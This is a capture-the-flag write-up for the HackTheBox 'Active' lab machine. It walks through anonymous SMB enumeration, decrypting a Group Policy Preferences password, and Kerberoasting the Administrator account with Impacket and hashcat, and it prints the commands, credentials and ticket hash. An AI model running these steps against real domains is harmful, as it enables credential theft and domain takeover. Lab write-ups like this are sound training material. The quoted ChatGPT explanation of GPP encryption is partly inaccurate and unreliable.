## Main points
- Enumeration of no-login SMB and decrypting GPP 
- Getting Service Principal Names and matching the hash

## Enumeration
Nmap scan:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-18 09:24:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: 14s
| smb2-time: 
|   date: 2023-07-18T09:25:18
|_  start_date: 2023-07-18T05:16:37

```

## SMB Foothold

This system has smbshare on port 139 and 445 that can be listed with `smbclient --list={{server}} --no-pass` and open directory to join `smbclient //10.10.10.100/Replication --no-pass` 

After quick check I've downloaded the whole file structure with `smbget smb://10.10.10.100/Replication --recursive --user anonymous%` and with `tree` explored the file structure. Quick look at content of all the files with `find . -type f -exec bat {} +` to find encrypted password for **user SVC_TGS**: 

edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

According to ChatGPT:

*Group Policy Preferences (GPP) encryption is a feature in Microsoft Windows that allows administrators to secure sensitive data stored in Group Policy settings. GPP provides a way to configure settings and preferences for users and computers within an Active Directory domain environment. These settings include mapping network drives, deploying printers, setting registry keys, and more.
Before the introduction of GPP encryption, Group Policy settings were stored in clear text in Group Policy Objects (GPOs), which could potentially expose sensitive data such as passwords or other confidential information. GPP encryption addresses this security concern by providing a mechanism to encrypt specific settings within GPOs.*

`gpp-decrypt` tool de-crypts the password immediately:
**password: GPPstillStandingStrong2k18**

`smbclient //10.10.10.100/Users --user SVC_TGS%GPPstillStandingStrong2k18`

Flag is located no users Desktop.

## Escalation

Using acquired credentials I am using Impacket’s GetUserSPNs.py that will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account’s password, which can then be bruteforced offline.

`./GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request`

Which returns:

```
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-08-04 20:13:45.618303



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$213c55e4806df3f3d4080103e18ba64e$9056bd4b77621d01d0fb6d902cea13218c2e1763ce0b66248ed9f0c8291a9065d1ac6538b31c1aa466f321c04f694edac52e3095a8bf57eee95ca10c65683457735b56ec5b068c2a03f64d9ba4c4d05ab8afc61493d461baf1dfb1b6166cf2f3bb85bb7b6313a18c94fad059d6f2765b28af8848b1b2a4a2731bba880d00d94eb620f2ea9c78da17c95deea5c7ecd0d9d5fbda0a635b8f1daeba540cdcdb04bf24f86cd2d1e40b81022bc1d7b6ae47cbe7331017f46d6f405d7553f49eec77d2a010404d68e2067bd2f088d9bced0ac98d892d75dfb9d8a881d775235a6feeeb856ec11e3100d3224c1b51e16cbe033739ecda5842f2778a0720b6a2f13c41ce045b38df6640b6a78c2e8a3fb73612efadc6f307f526d66dea17254bafcce46c8a2884f7f439756bf3fb0c3dd05a0bf5ceb36ef0923c06e67703acc4f289b59e0278f2ddd57699fa4e84ac8450b39c4966781a248c79bdbff5b2a5d8f92d5a322c066adf92760ca57f52f4209322ff52a7f741d04cebd8fab0b4231f004f28bfbee5fbef0da5523bd8763be0d6c7343e71d2e4266900c5f9b5cb5cbcbe2fb0d98d4ae19c278faa43bae0b3d02abe02ddb56eeb0b137b4da328bf821bdd42b0bc79f90c6e89c2c5df79a7081f083d55ff153bb2b0dbaccd7a79690c714205abe2b12936be13876407f7823c580bc28048129ff5b3bf52120a41ddbe575fea1a3aaf7136486be842c959dfb78d041fb1615b647ed27527e722c720d3c980620253aaed3b30c1b6f2f5c3918064ca0bc1ff46dfe436a7d38ce88c5c64e7d090ff757050bf55e64e7b3616f253fd2a72d5e3973e7cfd5b0900b351bcc51f351b666bc7d53d2d0532bf12d7462547583ec83d16942334b4a124931003d2012ea9dad6d18564b1e442a6b38a3fb62c2fefef53173f4f4da49452cfcbbd462290d6c2c84e05c670377df6d6e7f9c87bfd7a0c246caf3106419ca1672c3e36491cc8969dd03ebc9b6c920798c787f81a01119bca4ae0831210c9a250bc4c6f361a9634450d3d025abbf109bfa685bb867badb5cc3663a319d5d39000fb6d4f43009ae432f153439cf3191b861ce2736c5030ec8e4705d7eb2ca3106426e01d6a719c58cd5bf285ae5a0bf6c166d344fa4def5be0499db016ec7c3970680950440378092d2a8a604554e9cc5609fc44d7c4291919c5e982e23fff2393db0c40320c1fe4a4edad78a074c7abf841f0cec312eb8544febfaf05d48c49e35731
```

Using hashcat to match the hash and display password:

`hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable --show`

Success!

## Additional links:
https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/
https://www.tarlogic.com/blog/how-to-attack-kerberos/
https://www.youtube.com/watch?v=jUc1J31DNdw